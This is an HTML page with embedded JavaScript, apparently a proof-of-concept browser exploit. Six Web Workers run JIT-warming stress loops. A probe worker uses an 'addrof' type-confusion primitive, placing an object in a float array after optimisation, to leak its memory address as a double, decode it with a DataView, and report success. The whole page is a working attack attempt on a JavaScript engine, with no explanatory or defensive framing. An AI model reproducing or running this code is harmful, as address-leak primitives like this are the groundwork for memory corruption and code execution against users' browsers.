<!DOCTYPE html>
<html><body>
<h1 id="s">Waiting...</h1>
<div id="log" style="font-size:16px"></div>
<script>
function log(s){document.getElementById('log').innerHTML+=s+'<br>';}

// STRESS WORKERS
var wStress=`
  function leak(o){return o.a+o.b+o.c+o.d;}
  for(var i=0;i<300000;i++) leak({a:1.1,b:2.2,c:3.3,d:4.4});
  while(true){
    var arr=[];
    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1,c:i+2,d:i+3});
    leak(arr[0]);
    arr=null;
  }
`;
var u=URL.createObjectURL(new Blob([wStress],{type:'text/javascript'}));
for(var i=0;i<6;i++) new Worker(u);

// ADDROF WORKER — ayrı thread
var wProbe=`
  function addrof(val){
    var arr=[1.1,2.2,3.3];
    function rd(a){return a[0];}
    for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
    arr[0]=val;
    return rd(arr);
  }
  var target={secret:0x1337};
  var attempt=0;
  
  function probe(){
    attempt++;
    var leaked=addrof(target);
    var buf=new ArrayBuffer(8);
    var dv=new DataView(buf);
    dv.setFloat64(0,leaked,true);
    var lo=dv.getUint32(0,true);
    var hi=dv.getUint32(4,true);
    var isNaN_val=(hi===0x7ff80000&&lo===0);
    
    if(!isNaN_val){
      postMessage('GOT: 0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0')+' attempt:'+attempt);
      return;
    }
    if(attempt%50===0) postMessage('attempt '+attempt+' NaN');
    setTimeout(probe,2);
  }
  
  // Stress worker'lar ısınsın
  setTimeout(probe,4000);
`;

var pw=new Worker(URL.createObjectURL(new Blob([wProbe],{type:'text/javascript'})));
pw.onmessage=function(e){
  log(e.data);
  if(e.data.indexOf('GOT')===0){
    document.getElementById('s').textContent='✅ '+e.data;
  }
};

document.getElementById('s').textContent='Running...';
</script>
</body></html>
